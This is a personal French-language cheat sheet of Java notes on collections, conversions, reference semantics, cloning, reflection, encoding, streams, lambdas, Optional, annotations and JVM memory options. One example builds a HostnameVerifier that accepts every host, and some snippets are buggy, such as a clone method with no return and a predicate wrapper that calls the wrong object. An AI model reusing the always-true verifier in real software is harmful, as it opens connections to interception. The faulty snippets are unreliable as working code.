    AbstractCollection, AbstractList, AbstractSet, ArrayList, BeanContextServicesSupport, BeanContextSupport, HashSet (ordre pourri non fiable, vire les doublons, non threadsafe) , LinkedHashSet(conserve l'ordre d'insertion), LinkedList(comme arraylist: ordonné et duplicats possibles mais il gere mieux la memoire si données dedans sont tres manipulées), TreeSet garde l'ordre?, Vector
pour faire un minus: list A moins list B en utilisant removeall (on peut aussi utiliser retainall) avec des objets de type non primitifs dans les listes:
retainall: LINKDLKJSDF Retains only the elements in this Vector that are contained in the specified Collection. In other words, removes from this Vector all of its elements that are not contained in the specified Collection. 
				il faut que notre objet non primitif ait cette signature de methode pour que ca marche: 
				@override  // a utilser aussi quand je veux verifier qu'un objet n'exite pas dejà dans une liste du meme objet : ajouter cetrt e methode à l'objet
        public boolean equals(Object a)
					{
						Select sa = (Select)a;
						boolean ret=false;
						if (sa.value.equals(this.value)) ret= true;
						return ret;
					}
pour parcourir une liste d'objets: 
parcourir une collection c'est pareil
				List<Transporteur> transporteurs = findActiveTransporteurs();
				for (Transporteur t : transporteurs) {
convertir un Number en int: 
		Number.intValue()
convertir un double en int integer et convertir un double en long: 
            ne pas utiliser Double.doubleToLongBits(tailleFinal)
      mais
			       long tailleFinalLong = (long)Math.round(monDouble);
						int tailleFinalLong = (int)Math.round(monDouble);
convertir un integer en double
    double toto = (double)unint;
convertir un long en double:
      		Long time = new Long(unlong);
    		zyBean.setZY5NDUREEC(time.doubleValue());						
convertir un float en int: 
    float convertisseur = dureeBOrig*inputStream.getFormat().getFrameRate()*inputStream.getFormat().getFrameSize();
		  //optionnel: convertisseur = Math.round(convertisseur); 
      int convertisseurInt=(int)convertisseur;
      ou plutot 
      int convertisseurInt=(int)Math.round(convertisseur);
switch-case en java: switch : case : 
					switch (i) 
					{ 
					case 11: <action11>; break; // ne pas oublier le break ou le return a chaque fin de ligne 
					case 12: <action12>; break; 
					default: 
					if (i>=0 && i<=10) 
					<actionCommune>; 
					}
pour recuperer le nom d'une classe: 
	maclasseinconue.getClass().getCanonicalName();
	.getEnclosingClass() recupere le nom de la superclasse je crois
pour merger deux collections:
		Collection.retainAll(Collection c) (c'est comme un "et") voir LINKDLKJSDF
pour faire un "ou"
		Collection.addAll(Collection c)
		
pointeurs :     "En java, les paramètres pour les types primitifs sont passes par valeur, et pour les types objets c’est une copie de la reference Java (un Handle) qui est transmise."
                Toto toto = new Toto("1");
                 Lala lala = transform(toto);
                 public Lala transform(Toto toto) 
                 {
                  toto.setName("3"); // c'est un pointeur. Change la variable hors de la meth. Marche même si toto est final. (public Lala transform(final Toto toto))
                  toto = new Toto("2"); // change seulement la valeur localement. Ne compilerait pas si toto etait final   
                 }
      dans la liste je rajoute des elements qui sont les memes que je modifie a chaque iteration: la liste contiendra differents elements:
                                      dates est une liste de dates.
                                      List<Date> dateslist = new ArrayList<Date>();
                                      for (int i = 0; i<dates.length; i++)
                                      {
                                           Date after = null;
                                           after = formatter.parse(dates[i]);
                                           ...
                                           dateslist.add(after); // dateslist contiendra differentes dates! pas de pointeurs ici
                                      }
                                      return biggest; // attention c'est une date qui est retournee
                                  }
      ici la hashmap ne se met pas a jour toute seule si je modifie ses valeurs internes. Il faut refaire "put" pour mettre a jour: 
          	public Map<String, Integer> test(String fileName, Map<String,Map<String,String>> appSubFileType) throws Exception {
          		Map<String, Integer> ret = new HashMap<String,Integer>();
          		Integer startFtpTransfert=1;
          		Integer fileId=0;
          		ret.put("boolean", startFtpTransfert);
          		ret.put("fileId", 0);
         			startFtpTransfert=0; // rien ne change dans la hashmap
        			startFtpTransfert=1; // rien ne change dans la hashmap
        			fileId = 15;          // rien ne change dans la hashmap
          		ret.put("boolean", startFtpTransfert); // la hashmap est mise a jour
          		ret.put("fileId", fileId);             // la hashmap est mise a jour
           
     List<MonObjet> : mods est un objet de type List<ModDto>.
        for (ModDto modDto: mods) {
        					if (modDto.getNumQu().equals(queDto.getNumQu())) {
        						modDto.setTransverse(transverse);//ici je modifie directement dans le tableau la valeur!! pointeur.
        					}
        				}
  getter de tableaux (list map...): 
  		attention dans une classe quand on fait un getteur de tableau la classe va renvoyer un pointeur de ce tableau. (car type non primitif)
        		regle aca: Exposition de tableau interne: Une methode ne doit pas retourner un tableau interne directement mais sa copie.
		cloner :Clone :	LINKCloner du coup faire comme ca: voir https://programming.guide/java/copying-objects-deep-and-shallow.html. Encore mieux: voir LINKlkgkgkhgkfdlkjfglk (serialisation permet de cloner.) 
  						public List<Object[]> getOtherValues() 
  						{
  							ArrayList<Object[]> pointer = (ArrayList<Object[]>)this.otherValues;
  							return (List<Object[]>)pointer.clone(); // LINKCloner attention ça clone que le premier niveau de l'array (c a d shallow cloning)
                                                                        pour tout copier cloner meme dans les sous niveau je peux faire de la serialization
  						}
  			sinon pour cloner un objet: lui mettre un constructeur comme ca:     public Result(Result another) {
                                                                                        this.agencyName = another.agencyName;
                                                                                        this.agencyDescr = another.agencyDescr;...}

  	 idemn pour une methode
  	 Map<String, IndComodifDto> indicateursMap = new HashMap<String, IndComodifDto>();
  	 this.getLupAcceptees(code, debut, fin, indicateursMap);
      la methode getLupAcceptees qui contiendrait un "indicateursMap.put(ncomodif, ind)"'; modifierait directement la map dans la classe et pas que dans la methode.
  				ArrayList<Object[]> pointer = (ArrayList<Object[]>)this.otherValues;
  		return (List<Object[]>)pointer.clone(); LINKCloner 
  	De meme si j'ai 
  	     Set<String> result = new HashSet<String>();
  	     addDescriptor(result, (EntityDescriptor) object);
  	     private void addDescriptor(Set<String> result, EntityDescriptor descriptor) 
         {
            result.add(entityID);
          }
          result est directement modifie en dehors de la methode!
  pour copier une liste d'objets "Dog" sans les references mais en faisant des listes d'objets "Dog" independents:
		Deux methodes: Constructeur ou clone:
				Constructeur:
									public class Dog 
									{
									
    											public int age;
    											public int weight;
													    public Dog() { }
													    public Dog(Dog original) 
													    {
													        age = original.age;
													        weight = original.weight;
													    }
									}
									Mais ne marche plus si on etend la classe Dog:
									public class Dalmatian extends Dog {
									    public int spots;
									}
									là si on fait: Dog dog2 = Dog(Dalmatian dog1)
									on va zapper l'objet "spots" et on aura un nouvel objet "Dog" au lieu de "Dalmatien"
		sinon: (implementer l'interface Cloneable ET ajouter la fonction clone(elle ne s'impose pas toute seule dans l'editeur!!!): LINKCloner
						ne garantie pas que l'objet renvoye soit une copie Exacte. De plus:
										public class Dog implements Cloneable 
										{
									    public int age;
									    public int weight;
									    // jusqu'a la ca marche mais si j'ai ca:
									    public final List<String> names = new ArrayList<String>(); (final car cree lors de la construction et non nul)
									    
									    public Dog clone() // je la met public 
									    {
									        try 
									        {
									            Dog clonedDog = (Dog) super.clone();
									            // a faire imperativement ci dessous sinon la liste names sera partagee entre les deux clones
									            clonedDog.names = new ArrayList<String>(names); (ne marchera pas si la liste names est final)

									        }
									        catch (CloneNotSupportedException e) 
									        {
									            throw new Error("Is too");
									        }
									    }
									}
pour instancer une interface sans creer sa sous classe qui l'implemente : comme une classe anonyme :
      ici HostnameVerifier est une interface dans Java7: 
      HostnameVerifier hv = new HostnameVerifier() 
        {
           public boolean verify(String hostname, SSLSession session) 
           {
            return true; // j'ai implemente la methode! pas besoin de creer une sous classe qui implemente HostnameVerifier  
            } 
        }		
pour executer une interface en passant le nom d'une classe de cette interface en dur: introspection
			IState state = (IState) Class.forName("cpi.sm." + clase).newInstance(); // peut etre c mieux d'utiliser chez Spring: ClassUtils.forName("mon.package.MaClasse", classLoader (c'est CetteClasse.class.getClassLoader());
			state.execute(conn, bean);
pour creer une instance par constructeur avec un argument par introspection :
      EdsnGroup sdf = (EdsnGroup)ConstructorUtils.invokeConstructor( Class.forName("com.soprahr.edsn.usermanager." + edsnClass), edsnPerim); Attention le classloader n'est peut etre pas celui que je veux: risque de bug de type: la classe n'est pas visible ailleurs			
pour executer une methode function fonction de cette classe instanciee par son nom: (introspection)
          		try
          		{ // ici action = un string qui correspond au nom de ma methode. new Class c'est le tableau de type des parametres qu'on envoit a la methode
          					java.lang.reflect.Method methodExecute = FixPackCommand.class.getMethod(action, new Class[] {argument1.classOuObjetClass, argument2.classOuObjetClass}); // attention ma methode doit etre public!!! sinon ne la trouve pas
          					                                                                             exemple:new Class[]{clazzDataStructure, String.class} );
          					methodExecute.invoke(this(CaDireObjetQuiPossedeLaMethode), (Object[])new Class[] {}); // comme on a mis "this" si la methode set un parametre de null a xxx, et bien notre classe this aura mis a jour son parametre!! genial!
          					              exemple:this,new Object[] {enum_ZY, information.getHrName().substring(2)});
          		    recuperer les champs d'une classe par inscropection :
          		            codeListBean = ClassUtils.forName(Constants.PACKAGE_CODE_BEAN_NAME + ".CodeListBean", this.getClass().getClassLoader());
			                     Field[] fields = codeListBean.getFields();
			                     // savoir c'est quoi comme genre de champ? publique? static? (c'est le modifier) et son type:
          			                     for (int i = 0; i < fields.length; i++) 
                                     {
          				                                int modifier = fields[i].getModifiers();
          				                                if (Modifier.isFinal(modifier) && Modifier.isStatic(modifier) && Modifier.isPublic(modifier) && fields[i].getType().isArray()) {
          				                  }
          		}
          		catch (IllegalAccessException e)
          		{
          		...
          		}
           ou
							Object obj = state.newInstance();             
							Method[] methodsService = obj.getMethods(); ou obj.getClass().getMethods();
   							for (int i = 0; i < methodsService.length; i++) 
   							{
		                methodName = methodsService[i].getName();
		                if (methodName.startsWith("set")) {(...)
									java.lang.reflect.Method methodExecute = obj.getMethod("execute", new Class[] {});
									methodExecute.invoke(obj, new Class[] {});
encodage :
		En interne en Java toutes les Strings, les char et charset sont encodes en UTF-16. En Java il est abberant de vouloir changer l'encodage d'une String !
		String str = "blah";		// c'est forcement de l'utf16
		Cependant je peux forcer tout mon programe java à fonctionner avec un autre encodage en lancant mon programme java comme ca:
		java -Dfile.encoding=ISO-8859-15 -Dlog4j.configuration=file:/var/w(...)tchs/log4j.properties -Dconfpath=/v(...)tchs/Parser.properties -jar /var/www(...)adMails.jar 
		CharsetEncoder isoencoder = Charset.forName("iso-8859-1").newEncoder();
		CharsetEncoder utf8Encoder = Charset.forName("UTF-8").newEncoder();
		/*pour savoir si cette chaine de caractere peut etre encodee en iso-8859*/
		boolean okutf8 = utf8Encoder.canEncode(query);
		boolean okiso = isoencoder.canEncode(query);
		// on essaye d'ecoder en utf8
		1)		InputStream inputStream = new ByteArrayInputStream(monString.getBytes());
					InputStreamReader inputStreamReader = new InputStreamReader(inputStream, Charset.forName("UTF-8"));
		2)			byte[] bytes = utf8Encoder.encode(CharBuffer.wrap(query.toCharArray())).array(); // on a un tableau de byte en utf8
		3)			String toto = new String(bytes); // on reconverti de utf8-> utf16: le string en fait devient du n'importe quoi.
				// on converti un string en ISO puis en UTF-8 (pas sur que ca marche puisque un string est toujours en utf16)
		4)			String stringISO = new String (query.getBytes(), "ISO-8859-1" ); // marche ! 
		5)			String stringUTF8 = new String (bytes, "UTF-8" );
		unicode -> UTF-8
		        byte[] utf8Bytes = originalUnicode.getBytes("UTF8");
              String roundTrip = new String(utf8Bytes, "UTF8");
              ou bien   chaine = StringEscapeUtils.unescapeHtml(chaine);

    String roundTrip = new String(utf8Bytes, "UTF8");
attention la fonction File.renameTo peut ne pas marcher: LINKjgdlkqjfqdgmlk 
		toujours verifier par la variable de retour que ca s'est bien passe car en fonction des os win-unix pb compatibilite

java8 :
voir LocalDateTime!!!! 
lambdas : lambda : lambdas expression :     (lire http://labs.excilys.com/2014/10/28/prise-en-main-des-lambdas-expressions-dans-java-8/ que je n'ai pas mis ici)
      dès que je vois Linterface a=(y)-> y.tata    je dis "Linterface a = new class toto implement Linterface" 
                                                                            luniqueMethode(TypeDe y){
                                                                              return y.tata;
                                                                          }" Finallement ce qu'il y a après -> est execute. c tout. et renvoye si ->{} (voir plus bas Linklksdjgghgh)
       SQL      LAMBDA     "ne pas traiter d'objet mutable dans le stream car ils pourraient être partages par plusieurs threads"                                                                     
      table   =.stream()   //.parallelStream() attention: cree un max de threads pour rendre une reponse très rapide vite mais utilise tous les threads possibles. Un stream n'est pas une donnee concrete c'est des methodes + un flux
                              stream peut etre sized/non-sized(infini pour faire une boucle:Stream.iterate(n,e->e+1);LINK3223) ordered/non-ordered(les elements n'ont pas de position); distinct/non-distinct(pas de doublons possibles); sorted/non-sorted(alpha)
      unMap<x,y>.entrySet().stream(entry->entry.getValue()...entry.getKey()) // voir aussi LINKmaptomapsldkjfa pour convertir une map en une autre map                               
      select  =.map(e-> (D)e) ou contraction:(::) .mapOuForeach(this::uneFonctionDeCetteClasseQuiMapL'objetEntrantEnObjetEnSortie)   // utilise pour transformer l'objet.(meme calculs) transforme un objet en un autre  exemple classeTOTO devient classeTITI c'est du transcodage mappage mapping d'un element en un autre
                                                  .map(UneClasse::new) // map en une autre classe grace au constructeur de cette autre classe
                                                   .unelisteDuneInterface.stream().map(i->(ComponentGeneric)i)... //en un autre casting
                                                   convertir une observablelist observable liste en liste :
                                                    observableliste.stream().collect(Collectors.toList());  
        on peut faire: maclasse.envoimail("adresse",UneClasse::uneMethodeDeUneClasse); c'est la mort du pattern strategie strategy-template ou encore voir DesignPatterns.doc  
                xxx.foreach() : avec un biconsumer :exemple: // si xxx est un map on ne peut pas retourner une valeur avec. Il faut passer par un stream
                                volumesInnerData.innerDataPerYear.forEach(new BiConsumer<Integer, InnerData>()
                                  {
                                      @Override
                                      public void accept(Integer year, InnerData innerData)
                                      {
                                          int newVolume = (int)Math.round(InnerData.this.percent * innerData.volume);
                                          InnerData.this.innerDataPerYear.put(year,new InnerData(newVolume));
                                      }
                                  });
               .mapToDouble() // pareil que ci dessus mais contracte.
                .reduce(unevaleurinitiale,(carry,elt)->carry+elt) // ca permet par exemple de cumuler les elements.  carry est le resultat renvoye par element calcule precedent
                 .sum() // fait pareil que reduce mais contracte et pas de valeur initiale.
                 .max() // retourne la seule valeure maximal de tout le stream
                 .average() // retourne la moyenne de tout le stream
                 .orElse(valeurAretournerSiACeNiveauOptionalEstEmpty)
      distinct=.distinct() // vire les doublons. 
      join    =.flatMap(e->...stream()) // fonctionne avec Optional : LINKOptsngz exemple flatMap(c->c.getSubElements().stream()) (recupere proprement la sousliste)   
                      retourne les fils    
              evite les listes de listes  
              exemple pour recuperer les sous-listes sousliste sous listes à concatenner entre elles : List<Allocations<Component>> allocations = instanceFeatures.stream().map(f -> f.getAllocations()).flatMap(List::stream).collect(Collectors.toList()); ou .collect(Collectors.toCollection(FXCollections::observableArrayList));
            LINKOptsngz optionnal :(c 1 monad): ignore les valeurs empty nulles et retourne un Optional // a utiliser que si j'ai un probleme avec null Traitement des valeurs pouvant etre nulles depuis java8 LINKjajsdfliuaerOpt c'est a utiliser dans le cadre de functionnal programming lambda. Ne jamais mettre un optionnal dans un parametre de methode (ni un setter) mais toujours que en sortie.
                                             Optional<UneClasse> optional = Optional.ofNullable(unevariablepouvantPotentiellementEtrenull);                                                                                                     |_a la place faire monOptinal.map(unefonction)
                                                                           Optional.ofNullable(unevariablepouvantPotentiellementEtrenull).orElse(variableARetournerSiNull);
                                                                           Optional.ofNullable(unevariablepouvantPotentiellementEtrenull).orElseGet(()->{...}); // une methode a executer qui renverra la bonne valeur a la place de null 
                                                                         = Optional.of(unevariableQuiNestPasNullMaisCPourRenvoyerOptional<X>);
                                                                         = Optional.empty(); // pour retourner Optional à la place de null pour le traitement dans lambda
                                                                              List<Optional<Maclasse>> uneListeAvecDesOptionals. pour la filtrer sans prise de tete la convertir d'abord en list<Maclasse> en virant les nulls comme ça :        
                                                                                    List<IParameter> parameters= optionalparameters.stream().filter(Optional::isPresent).map(obj ->obj.get()).collect(Collectors.toList()); ou .collect(Collectors.toCollection(FXCollections::observableArrayList));
                                                                                    List<MaClasse> parameters= uneListeAvecDesOptionals.stream().filter(Optional::isPresent).map(obj ->obj.get()).collect(Collectors.toList()); ou .collect(Collectors.toCollection(FXCollections::observableArrayList));                                                                                                         
                                            optional.or(()->autreMethode()); // si unevariablepouvantetrenull est null rempacer sa valeur par ce que renvoit autreMethode();
                                            optional.isPresent()
                                            optional.orElse("N/A").toString(); ou (String)unOptional.map(classeDedansOptional->((ClasseDedansOptional)u).methodeDeClasseDedans()).orElse("N/A")); // pas trouvé mieux pour faire un si present appelle une methode de mon objet dans optionel sinon fait autre chose
                                            optional.ifPresentOrElse(methode1(),methode2());
                                            optional.ifPresent(unConsumer); // exemple: aroot.getParameterByKey("pays").ifPresent(x->Assertions.assertEquals("FR",x.getValue()));
                                            optional.get() // extrait(unwrap) la valeur du contexte Optional
      where   =.filter(e-> e==2) // bloque cettains elements s'ils ne repondent pas à la condition dedans.
      order by=.sorted() // ordonne alphabetique
      limit= .limit(x) // recupère que les valeurs sous x inclu (faire une boucle LINK3223)
      stop= .takeWhile(s->!s.equals("END"))// ou un boolean onoff global (dès java9)
      union all=.concat()
      minus :   List<x> intersect = list1.stream().filter(list2::contains).collect(Collectors.toList());                                                                          
        PUIS A METTRE ABSOLUMENT SINON RIEN NE SE PASSE c'est seulement à la dernière commande que tout s'execute. (lazy procedure stockees):
  groupby :grouper : group by :=List<MaClass>.stream.collect(groupingBy(MaClasse::getNameOuObjet,LINKGRPDlsdflkj))) // retourne Map<NameOuObjet,List<MaClasse>> ne plus developper les groupebys!!
                ou
                                List<MaClass>.stream.collect(groupingBy(maClasse->new AutreBean(maClass.champ1,maClass.champ2)))  // Map<AutreBean,List<MaClass>
                    LINKGRPDlsdflkj:facultatif: ,mapping(MaClasse::getUnAutreParametre, toList())))  //  pour faire un Map<getNameOuObjet,List<getUnAutreParametre>>
                                                ,toSet() // pour faire un Map<getNameOuObjet,Set<MaClasse>>
                                                ,groupingBy(MaClasse::AutreChamp) // grouper par plusieurs champs A MIEUX DOCUMENTER
                                                ,SummingInt(MaClasse::getLikes)   // group et calcul somme par champ A MIEUX DOCUMENTER   
                  stream.collect(toList() ou toSet()//renvoit une liste  toSet vire les doublons ou  
                            convertir un map en autre map: unemap.entrySet().stream()...collect(Collectors.toMap(elt->elt.getKey().a,elt->elt.getValue().b)) // renvoit une genre de liste concrete. Utile pour convertir une map en une autre map LINKmaptomapsldkjfa
                                A ECRIRE JUSQUAU BOUT SINON CA NE COMPILE PAS!!!
                .findFirst().get() // get[0]              
                .forEach(System.out::println);
                .sum();
            codecasts.removeIf(c->c.getId()==i) // pour supprimer remove delete un element d'une liste de facon conditionnelle                
            clientsRoles.getItems().stream().forEach(w->logger.debug("clients role: "+ w));                                                                          
               public class Calculator 
               {
                  @FunctionalInterface // ne compile plus si j'ai plus de deux methodes non default dans l'interface. Le reste des methodes peut etre "default"
                  interface IntegerMath // juste une interface Linklksdjgghgh 
                  {
                      int operation(int a, int b); // il faut qu'il n'y ait qu'une seule methode pour que ca marche *   
                      default public void xxx(){etc}
                      default public void yyy(){etc}
                  }
                
                  public int operateBinary(int a, int b, IntegerMath op) // juste une execution de la methode de la classe qui etend l'interface 
                  {
                      return op.operation(a, b);
                  }
                  public static void main(String... args) 
                  {
                      Calculator myApp = new Calculator();                    ON DEFINIT ENTRE ACCOLADE CE QUE VA EXECUTER LA METHODE DE L INTERFACE (qui n'a q'une methode)
                      IntegerMath addition = (a, b) -> a + b; // equivaut à = new class titi implements IntegerMath
                                                                            { 
                                                                              int operation(a,b){return a+b;} * car ya qu'une methode
                                                                            }
                      IntegerMath subtraction = (a, b) -> a - b;
                      //si on a qu'un parametre on peut faire 
                        monparam -> monparam.titi; // ne return rien
                        monparam -> {monparam.titi}; // return
                      System.out.println("40 + 2 = " + myApp.operateBinary(40, 2, addition));
                      System.out.println("20 - 10 = " + myApp.operateBinary(20, 10, subtraction));    
                  }
              }
                exemple java8 pour facilement filtrer une liste ou une collection:(recuperer fichiers )filtrer les fichiers 
                         int sum = maCollection.stream() ou bien Arrays.stream(maList) 
                            .filter(w -> w.getColor() == RED)
                            .mapToInt(w -> w.getWeight()) ou mapToDouble()
                            .sum();						
                exemple java8 grouper en un chiffre le resultat de l'addition d'une liste de map d'objet
                            List<Map<Integer, InnerData>> yearlyinnerdatas = allInstanceFeatures.stream().map(f -> f.getInnerData().innerDataPerYear).collect(Collectors.toList());
                            List<InnerData> allInnerDatas = yearlyinnerdatas.stream().map(mapper -> mapper.values()).flatMap(f -> f.stream()).collect(Collectors.toList());
                            Integer totalvolume = allInnerDatas.stream().map(i -> i.volume).reduce((carry, innerdata) -> carry + innerdata).get();
                exemple java8 recuperer le premier element d'une liste dont le field des elements match une valeur: 
                          Result toto = resultats.stream().filter(r -> r.getTransitPlace().equals("arriveplace")).findFirst().get(););                            						
                exmeple java8 recuperer liste des fichiers les fichiers par leur nom dans un repertoire possible filtrer rapidement:
                               				File rootFolder = new File(Application.ROOT);
                                				List<String> fileNames = Arrays.stream(rootFolder.listFiles())
                                						.map(f -> f.getName())
                                						.filter(f -> f.startsWith(Integer.toString(ag.getId())+"."))
                                						.collect(Collectors.toList());
LINKconvertiCheckedExceptionDansUnStreamEnUnCheckedExceptionPourQueCaCompile :
           on utilise comme ça ci dessous. Si impossible alors thrower  une RuntimeException
           monarray.stream().map(handlingFunctionWrapper(x->lamethodeQuiRenvoitExeption(x), Exception.class))... // POUR LES MAPS
           et on mets ça:
                POUR LES FOREACH   @FunctionalInterface // pour un foreach par exemple
                                        public interface ThrowingConsumer<T, E extends Exception> {
                                            void accept(T t) throws E;
                                        }
                                        static <T, E extends Exception> Consumer<T> handlingConsumerWrapper(ThrowingConsumer<T, E> throwingConsumer, Class<E> exceptionClass) {
                                            return i -> {
                                                try {
                                                    throwingConsumer.accept(i);
                                                } catch (Exception ex) {
                                                    try {
                                                        E exCast = exceptionClass.cast(ex);
                                                        System.err.println(
                                                                "Exception occured : " + exCast.getMessage());
                                                    } catch (ClassCastException ccEx) {
                                                        throw new RuntimeException(ex);
                                                    }
                                                }
                                            };
                                        }
                                        @FunctionalInterface // pour un map par exemple
                                        public interface ThrowingFunction<T,R, E extends Exception> {
                                            R apply(T t) throws E;
                                        }
                                        
POUR LES MAP OU LES FOREACH      static <T,R, E extends Exception> Function<T,R> handlingFunctionWrapper(ThrowingFunction<T,R, E> throwingConsumer, Class<E> exceptionClass) {
                                            return i -> {
                                                try {
                                                    return throwingConsumer.apply(i);
                                                } catch (Exception ex) {
                                                    try {
                                                        E exCast = exceptionClass.cast(ex);
                                                        throw new RuntimeException(exCast);
                                                    } catch (ClassCastException ccEx) {
                                                        throw new RuntimeException(ex);
                                                    }
                                                }
                                            };
                                        }
POUR LES FOREEACH A 2 ARGUMENTS : j'ai d'un coté: 
                                    public static <T,R, E extends Exception> BiConsumer<T,R> handlingFunctionBiArgWrapper(ThrowingBiConsumer<T, R, E> throwingConsumer, Class<E> exceptionClass) {
                                                         return (i,j) -> {
                                                            try {
                                                                 throwingConsumer.accept(i,j);
                                                            } catch (Exception ex) {
                                                                try {
                                                                    E exCast = exceptionClass.cast(ex);
                                                                    throw new RuntimeException(exCast);
                                                                } catch (ClassCastException ccEx) {
                                                                    throw new RuntimeException(ex);
                                                                }
                                                            }
                                                        };
                                                    }
                                                    @FunctionalInterface
                                                    public interface ThrowingBiConsumer<T,R, E extends Exception>
                                                    {
                                                        void accept(T o, R o2) throws E;
                                                    }

                    et de l'autre, utilisation: componentInstance.getCosts().forEach(handlingFunctionBiArgWrapper((key, value) -> {
                                                (...)
                                                if (...) throw new CostlineNotDefinedException("blah");
                                                (...)
                                                                                        
                                        
                POUR LES FILTRES :    utilisation: .filter(handlingPredicateWrapper(gen ->getThisSameSymbolicParameterValue(gen, classificationNode, parameter).equals("Y"),Exception.class))
                                        declaration:
                                        public static <T, E extends Exception> Predicate<T> handlingPredicateWrapper(ThrowingPredicate<T, E> throwingConsumer, Class<E> exceptionClass) {
                                              return i -> {                                         // ca retourne donc un PREDICATE
                                                  try {
                                                      return ThrowingPredicate.test(i);              // ca retourne donc un PREDICATE donc ThrowingPredicate a la meme methode que Predicate mais lui il throw une exception contrairement a predicate
                                                  } catch (Exception ex) {
                                                      try {
                                                          E exCast = exceptionClass.cast(ex);
                                                          throw new RuntimeException(exCast);
                                                      } catch (ClassCastException ccEx) {
                                                          throw new RuntimeException(ex);
                                                      }
                                                  }
                                              };
                                          }
                                      
                                          @FunctionalInterface
                                          public interface ThrowingPredicate<T, X extends Throwable> {
                                              public boolean test(T t) throws X;
                                          }
                                                        
            exemple lambda imbriquees: une liste A contient une liste B. je dois filtrer A qui ont seulement certains B (converti un stream en liste directement dans le filtre)  A REVOIR
                            List<Result> toto = resultList.stream()
                              .filter(r -> // très mauvais lambda ! clean code:ne pas avoir de ->{ dans ce cas reporter le code dans {} dans une autre methode dans cette classe meme ou dans l'item en cours du stream ou une methode statique quelquepart
                              {               
                                  try {
                                      List<Time> hour = r.splitDepartureTimes();
                                      List<Time> hoursAfter = hour.stream()
                                              .filter(h ->
                                              {
                                                  try {        //eviter les trycatch dans lambda voir LINKconvertiCheckedExceptionDansUnStreamEnUnCheckedExceptionPourQueCaCompile
                                                      if (h.after(hourFormat.parse(timeDeparture)) || h.equals(hourFormat.parse((timeDeparture)))) {
                                                          return true;
                                                      } else return false;
              
                                                  } catch (Exception e) {
                                                      e.printStackTrace();
                                                      return false;
                                                  }
                                              }).collect(Collectors.<Time>toList());
                                      if (hoursAfter.toArray().length > 0) {
                                          return true;
                                      }
                                      else return false;
                                  } catch (Exception e) {
                                      e.printStackTrace();
                                      return false;
                                  }
                              }).collect(Collectors.<Result>toList());
              
                      return resultList;
                lambda : virer les doublons:
                    listWithDuplicates.parallelStream().distinct().collect(Collectors.toList());
  public interface B { 
    default void printSomething() {  // pas besoin d'implementer cette methode dans les filles. nouveau dans java8 interfaces
        System.out.println("something else");
    }
  }
  inverser changer l'order ordre d'une arraylist  A MIEUX DOCUMENTER voir aussi LINKordrelkjglfkdjss
             List<IProcessor> decorateds = Arrays.asList(decorated); //convertir en liste si c'est un tableau
                  Deque<IProcessor> inverseDecorateds =
                          decorateds.stream().collect(Collector.of(
                                  ArrayDeque::new,
                                  (deq, t) -> deq.addFirst(t),
                                  (d1, d2) -> { d2.addAll(d1); return d2; }));
fonctionnement des annotations :
                @MonValidateurBean(LINKvariablealacon=999) // customise, voir ci-dessous
                public String maPropriete; ou bien public class UneClasseAnnotee{
              ...
              }
              ailleurs
              @Inherited //facultatif. SI je met ça alors les sous classes de la classe annotée se comporteront comme leur classe parente annotée
              @Constraint (validatedBy=ClasseContenantLeCodeDeMonValidateurBean.class) //facultatif. Mais si on l'utilise voir LINKannotconstraintvalidator
              @Target ({ElementType.METHOD, ElementType.FIELD...}) //obligatoire.  ElementType.ENTITY (c'est pour une anotation d'une classe); ElementType.TYPE pour les interfaces ou les classes ; ElementType.CONSTRUCTOR: se metra donc seulement au dessus du constructeur d'une classe
              @Retention(RetentionPolicy.RUNTIME)  // obligatoire. RetentionPolicy.SOURCE ou COMPILE: l'annotation disparait apres compilation. ca ne sert que pdt les devs. RUNTIME: l'annotation est toujours là apres compilation et joue dans l'execution
              public @interface MonValidateurBean
              {
                int LINKvariablealacon() default=1; // je peux definir des variables ici qui doivent etre suivies de "()". là il y en a 4 qui par défault auront les valeurs indiquées par "default=..."
                String message() default="{mon.message.i18n}"; 
                Class<?>[] groups() default{};
                Class<? extends ConstraitPayload>[] payload() default{};
              }
              ailleurs 
              main...
              {
                    je peux faire ça : UneClasseAnnotee toto = new UneClasseAnnotee();
                                        Class classe = toto.getClass();
                                        Annotation annot = classe.getAnnotation(MonValidateurBean.class)
                                        MonValidateurBean sonAnnotation = (MonValidateurBean)annot;
                                        System.out.println(sonAnnotation.LINKvariablealacon); retournera 999 
              }
              ailleurs LINKannotconstraintvalidator
              public class ClasseContenantLeCodeDeMonValidateurBean implements ConstraintValidator<MonValidateurBean,String // du type de maPropriete>
              {
                public void initialize (MonValidateurBean parameters) // fait de l'introspection sur MonValidateurBean
                {
                  // est toujours execute en 1er premier
                }
                public boolean isValid(String value, ConstraintValueContext?? context)
                {
                  ... ma logique...
                  return true ou false;
                }
              }   
              }
pour tester la performance : perfs : perf : performances : performences :
            logger.debug("1TestPerformance: "+new Date(System.currentTimeMillis()).toString());
            si j'ai exception outofmemory error heap space faire ca: 
            Xms : espace alloue à l'init pour les objets(instances)                         |_heap
            Xmx : espace alloue max pour les objets(instances) si depasse: heapoutofmemory  |
            MaxPermSize : espace pour les CLASSES (pas les instances mais tout ce qui est static) par defaut 64MegaByte. A partir de java8 c'est stocké dans le metaspace oùy a plus de limites         
    				JAVA_OPTIONS="-Xms64m -Xmx256m"----> Xmx512m ou Xmx1024m ou Xmx1800m ou Xmx2048(!!ennorme) pour avoir à disposition 1Go de memoire sur le heap. En general on met 700m Meg sur les applis Renault
    				en theorie : Xms=1/4 de Xmx
    				sur eclipse on peut dans "executer" ecrire dans Arguments VM: -Xmx1024m OU -XX:MaxPermSize=1024m
    				ou bien mettre -XX:-UseGCOverheadLimit et la on a pas de limite mais ca va durer longtemps
    				ou modifier eclipse.ini a cote de eclipse.exe
    				---->-Xmx3072m 2Giga sur une machine 64bits
    				---->-Xmx3072m 3Giga sur une machine 64bits
    				pour que le dump se genere automatiquement au plantage : 
    				        -XX:+HeapDumpOnOutOfMemoryError
    				        -XX:HeapDumpPath=/DumpJVM/ope/.../lkjsdflkj/toto
    				        -XX:+UseG1GC -XX:-UseAdaptiveSizePolicy \   // pour utiliser le garbage garbadge collecteur G1 qui d'après Rachid Asbai est plus intelligent
    				        -XX:+UseZGC (depuis java11 voir ci dessous)
    				        depuis java 11 :java11 : ZGC est super baleze comme garbadge collector. EpsilonGC est un GC de test qui ne garbadge jamais jusqu'à memoryexception
    				pour savoir combien mon poste en local a de mem: gestionnaire de taches windows: >memoire physique > disponible les trois premiers chiffres
